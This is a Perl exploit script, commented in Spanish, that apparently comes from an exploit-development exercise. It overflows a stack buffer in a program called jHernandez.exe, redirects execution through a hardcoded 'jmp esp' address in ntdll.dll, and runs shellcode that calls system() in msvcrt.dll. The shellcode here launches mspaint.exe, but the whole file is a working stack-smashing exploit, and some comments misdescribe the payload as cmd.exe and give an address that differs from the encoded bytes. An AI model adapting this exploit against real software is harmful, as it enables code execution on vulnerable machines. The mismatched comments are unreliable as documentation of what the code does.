#!/usr/bin/perl -w
use strict;
use warnings;

my $junk = "A" x 1672 . "B" x 4;  # Se llena el búfer (variables locales y EBP)

my $ret = pack('V',0x76ECE871); # findjmp2 ntdll.dll esp # 0x76ECE871 jmp esp

my $shellcode =                 # Payload
"\x55" .                        # PUSH EBP
"\x8B\xEC" .                    # MOV EBP, ESP
"\x33\xFF" .                    # XOR EDI, EDI # EDI = 0x00
"\x57" .                        # PUSH EDI     # Fin de cadena
"\x83\xEC\x0C" .                # SUB ESP, 0Ch
"\xC6\x45\xF4\x6D" .            # mov byte ptr [ebp-0Ch], 6Dh ; "m"
"\xC6\x45\xF5\x73" .            # mov byte ptr [ebp-0Bh], 73h ; "s"
"\xC6\x45\xF6\x70" .            # mov byte ptr [ebp-0Ah], 70h ; "p"
"\xC6\x45\xF7\x61" .            # mov byte ptr [ebp-09h], 61h ; "a"
"\xC6\x45\xF8\x69" .            # mov byte ptr [ebp-08h], 69h ; "i"
"\xC6\x45\xF9\x6E" .            # mov byte ptr [ebp-07h], 6Eh ; "n"
"\xC6\x45\xFA\x74" .            # mov byte ptr [ebp-06h], 74h ; "t"
"\xC6\x45\xFB\x2E" .            # mov byte ptr [ebp-05h], 2Eh ; "."
"\xC6\x45\xFC\x65" .            # mov byte ptr [ebp-04h], 65h ; "e"
"\xC6\x45\xFD\x78" .            # mov byte ptr [ebp-03h], 78h ; "x"
"\xC6\x45\xFE\x65" .            # mov byte ptr [ebp-02h], 65h ; "e"
"\x8D\x45\xF4" .                # LEA EAX, DWORD PTR SS:[EBP-08h] # Dirección de "c"
"\x50" .                        # PUSH EAX                        # "cmd.exe\0"
"\xBB\x6F\xB1\xE3\x75" .        # MOV EBX, 0x760CB16F # system() en msvcrt.dll
"\xFF\xD3" .                    # CALL EBX # Ejecuta system() con argumento cmd.exe
"\x57" .                        # PUSH EDI # 0
"\xBB\xAA\x36\xDF\x75" .        # MOV EBX, 0x760836AA # exit() en msvcrt.dll
"\xFF\xD3";                     # CALL EBX # Ejecuta exit()

my $exploit = $junk . $ret . $shellcode;

print "\n" . "*" x 80;
print "\nCodigos de operacion: \n" . "\\x" . (join("\\x", unpack('(H2)*', $exploit)));
print "\n\nLongitud: \n" . length($exploit) . "\n";
print "\nCodigo ensamblador (shellcode): \n";
my $asm = join('', unpack('(H2)*', $shellcode));
system("disasmdump $asm");
print "\n" . "*" x 80;

system("jHernandez.exe", $exploit);

